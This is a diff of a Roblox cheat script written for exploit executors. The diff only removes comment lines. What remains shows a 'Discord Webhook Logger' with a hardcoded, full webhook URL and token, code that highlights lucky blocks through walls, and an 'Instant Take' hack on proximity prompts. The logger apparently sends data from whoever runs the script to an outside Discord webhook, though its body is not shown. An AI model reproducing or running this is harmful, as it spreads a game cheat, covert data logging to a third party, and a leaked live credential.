@@ -1,4 +1,3 @@
---// Discord Webhook Logger + Lucky Blocks ESP + Rare + Celestial + Refresh + Instant Take
 local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
@@ -6,7 +5,6 @@ local workspace = game:GetService("Workspace")
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
 
--- Discord Logger
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1466552183444078706/KK4pLVoGu0K_NQPy8-0I47-pQvKTr27zMP-1-3LNYbhdN3Yr288aFXROAsMljtRFevgK"
 local req = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
 
@@ -38,7 +36,6 @@ if req then
     end)
 end
 
--- GUI
 local gui = Instance.new("ScreenGui")
 gui.Name = "FaisalUI"
 gui.ResetOnSpawn = false
@@ -48,7 +45,6 @@ local topHeight = 26
 local buttonHeight = 28
 local padding = 6
 
--- ترتيب الأزرار + ألوان مخصصة + Rare + Celestial
 local orderedBlocks = {
     {name = "common lucky block", model = "NaturalLuckyBlock_Common", color = Color3.fromRGB(200,200,200)},
     {name = "uncommon lucky block", model = "NaturalLuckyBlock_Uncommon", color = Color3.fromRGB(0,255,0)},
@@ -74,7 +70,6 @@ main.Active = true
 main.Draggable = true
 Instance.new("UICorner", main).CornerRadius = UDim.new(0,10)
 
--- Top Bar
 local top = Instance.new("Frame", main)
 top.Size = UDim2.new(1,0,0,topHeight)
 top.BackgroundColor3 = Color3.fromRGB(25,25,25)
@@ -99,7 +94,6 @@ arrow.Font = Enum.Font.GothamBold
 arrow.TextColor3 = Color3.fromRGB(220,220,220)
 arrow.BackgroundTransparency = 1
 
--- Content
 local content = Instance.new("Frame", main)
 content.Position = UDim2.new(0,0,0,topHeight)
 content.Size = UDim2.new(1,0,1,-topHeight)
@@ -110,7 +104,6 @@ layout.Padding = UDim.new(0,padding)
 layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 layout.VerticalAlignment = Enum.VerticalAlignment.Top
 
--- Toggle
 local opened = true
 local openSize = main.Size
 local closeSize = UDim2.fromOffset(180,topHeight)
@@ -123,7 +116,6 @@ arrow.MouseButton1Click:Connect(function()
         {Size = opened and openSize or closeSize}):Play()
 end)
 
--- Highlight Models
 local highlightedModels = {}
 for _, block in ipairs(orderedBlocks) do
     highlightedModels[block.model] = {}
@@ -163,7 +155,6 @@ local function highlightModel(model, color, isRainbow)
     end
 end
 
--- Refresh Function
 local function refreshAll()
     for _, block in ipairs(orderedBlocks) do
         local isRainbow = (block.name == "celestial lucky block")
@@ -176,7 +167,6 @@ local function refreshAll()
     print("All Lucky Blocks refreshed!")
 end
 
--- Instant Take Function
 local function setPromptInstant(prompt)
     if prompt:IsA("ProximityPrompt") then
         pcall(function()
@@ -193,7 +183,6 @@ workspace.DescendantAdded:Connect(function(v)
     setPromptInstant(v)
 end)
 
--- Create Buttons
 for _, block in ipairs(orderedBlocks) do
     local btn = Instance.new("TextButton")
     btn.Parent = content
@@ -217,7 +206,6 @@ for _, block in ipairs(orderedBlocks) do
     end)
 end
 
--- زر Instant Take
 local instantBtn = Instance.new("TextButton")
 instantBtn.Parent = content
 instantBtn.Size = UDim2.new(1,-12,0,buttonHeight)
@@ -236,7 +224,6 @@ instantBtn.MouseButton1Click:Connect(function()
     print("Instant Take applied!")
 end)
 
--- زر Refresh
 local refreshBtn = Instance.new("TextButton")
 refreshBtn.Parent = content
 refreshBtn.Size = UDim2.new(1,-12,0,buttonHeight)
